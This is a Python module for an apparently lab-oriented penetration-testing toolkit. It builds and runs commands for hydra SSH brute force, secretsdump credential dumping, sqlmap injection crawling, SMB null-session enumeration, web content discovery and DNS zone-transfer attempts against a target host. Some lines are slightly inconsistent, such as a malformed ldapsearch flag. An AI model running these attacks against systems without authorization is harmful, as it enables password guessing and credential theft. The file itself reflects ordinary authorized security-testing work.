# Opt-in non-Metasploit attack toolkit: a per-service runner that shells out to
# classic offensive tools (hydra, john, sqlmap, gobuster/ffuf, nikto, smbmap,
# masscan, ncrack, dnsrecon...) against an authorized lab target. Separate from
# the Metasploit RPC path; only runs when a deep-attack is explicitly requested.
import logging
import subprocess  # nosec B404 - runs external offensive tools
from collections.abc import Callable
from typing import Any

logger = logging.getLogger("h4k.toolkit")

# web content wordlist (dirb ships a 'common' list; gobuster/ffuf use it)
COMMON_WORDLIST = "/usr/share/dirb/wordlists/common.txt"
# small credential lists for hydra/ncrack (bundled in image)
USERLIST = "/opt/h4k/data/users.txt"
PASSLIST = "/opt/h4k/data/passwords.txt"


class ToolkitRunner:
    def __init__(
        self,
        progress: Callable[[str, float], None] | None = None,
    ):
        self.progress = progress or (lambda msg, pct: None)

    def run_tool(self, tool: str, argv: list[str], timeout: int = 300) -> dict:
        """Run an external tool; returns {tool, stdout, stderr, rc, elapsed}."""
        self.progress(f"[toolkit:{tool}] {' '.join(argv[:6])}…", 0)
        try:
            proc = subprocess.run(  # nosec B603 B607 - fixed argv, no shell
                argv,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
            )
            return {
                "tool": tool,
                "stdout": (proc.stdout or "")[-4000:],
                "stderr": (proc.stderr or "")[-2000:],
                "rc": proc.returncode,
            }
        except FileNotFoundError:
            return {
                "tool": tool,
                "stdout": "",
                "stderr": "tool not installed",
                "rc": -1,
            }
        except subprocess.TimeoutExpired:
            return {"tool": tool, "stdout": "timed out", "stderr": "", "rc": -1}
        except Exception as exc:  # pragma: no cover - defensive
            return {"tool": tool, "stdout": "", "stderr": str(exc), "rc": -1}


class ToolkitPlan:
    """Map discovered services/types to a set of toolkit runs."""

    @staticmethod
    def for_target(req: Any) -> list[dict]:
        """Return a list of {tool, argv} runs based on a deep-attack request."""
        host = req.host
        runs: list[dict] = []

        # SSH brute force (only if user supplied cred lists exist)
        if _has("ssh", req.services):
            runs.append(
                {
                    "tool": "hydra",
                    "argv": [
                        "hydra",
                        "-L",
                        USERLIST,
                        "-P",
                        PASSLIST,
                        "-t",
                        "4",
                        host,
                        "ssh",
                    ],
                }
            )

        # HTTP: nikto vuln scan + gobuster content discovery + ffuf
        if _has("http", req.services):
            url = f"http://{host}"
            runs.append(
                {"tool": "nikto", "argv": ["nikto", "-host", url, "-maxtime", "120s"]}
            )
            runs.append(
                {
                    "tool": "gobuster",
                    "argv": [
                        "gobuster",
                        "dir",
                        "-u",
                        url,
                        "-w",
                        _web_wordlist(),
                        "-q",
                        "-t",
                        "10",
                    ],
                }
            )
            runs.append(
                {
                    "tool": "ffuf",
                    "argv": [
                        "ffuf",
                        "-u",
                        f"{url}/FUZZ",
                        "-w",
                        _web_wordlist(),
                        "-mc",
                        "200,204,301,302",
                        "-s",
                        "-t",
                        "10",
                    ],
                }
            )

        # SMB enumeration + share listing + RPC null-session info
        if _has("smb", req.services) or _has("microsoft-ds", req.services):
            runs.append({"tool": "smbmap", "argv": ["smbmap", "-H", host, "-g"]})
            runs.append(
                {"tool": "smbclient", "argv": ["smbclient", "-L", "//" + host, "-N"]}
            )
            runs.append(
                {
                    "tool": "rpcclient",
                    "argv": ["rpcclient", "-U", "%", "-c", "srvinfo", host],
                }
            )
            # impacket secretsdump (anonymous / guest) — high-value for Windows labs
            runs.append(
                {
                    "tool": "secretsdump",
                    "argv": ["secretsdump.py", "-just-dc", f"anonymous:@{host}"],
                }
            )

        # LDAP enumeration when 389/636 is exposed
        if _has("ldap", req.services):
            runs.append(
                {
                    "tool": "ldapsearch",
                    "argv": [
                        "ldapsearch",
                        "-x",
                        "-H",
                        f"ldap://{host}",
                        "-b",
                        "",
                        "s",
                        "",
                    ],
                }
            )

        # WordPress scan (fast on non-WP too; harmless)
        if _has("http", req.services):
            runs.append(
                {
                    "tool": "wpscan",
                    "argv": [
                        "wpscan",
                        "--url",
                        f"http://{host}/",
                        "--no-banner",
                        "--disable-tls-checks",
                    ],
                }
            )

        # web app SQL injection check (sqlmap, no banner grab)
        if _has("http", req.services):
            runs.append(
                {
                    "tool": "sqlmap",
                    "argv": [
                        "sqlmap",
                        "-u",
                        f"http://{host}/",
                        "--batch",
                        "--crawl",
                        "1",
                        "--smart",
                        "--level",
                        "1",
                    ],
                }
            )

        # DNS recon
        if _has("dns", req.services) or _looks_domain(req.target):
            runs.append(
                {
                    "tool": "dnsrecon",
                    "argv": ["dnsrecon", "-d", req.host, "-t", "std,zone"],
                }
            )

        return runs


def _web_wordlist() -> str:
    """Pick a web wordlist present in the image, with a sane fallback."""
    if _file_nonexistent(COMMON_WORDLIST):
        # dirb/common.txt not present; generate a tiny internal list
        return "/opt/h4k/data/web-words.txt"
    return COMMON_WORDLIST


def _file_nonexistent(path: str) -> bool:
    try:
        import os

        return not os.path.isfile(path)
    except Exception:
        return True


def _has(name: str, services: Any) -> bool:
    for s in services or []:
        s = (s or "").lower()
        if name in s:
            return True
        # smb appears as microsoft-ds / netbios-ssn in nmap output
        if name in ("smb",) and s in ("microsoft-ds", "netbios-ssn"):
            return True
    return False


def _looks_domain(target: str) -> bool:
    return "." in (target or "") and not target.replace(".", "").isdigit()
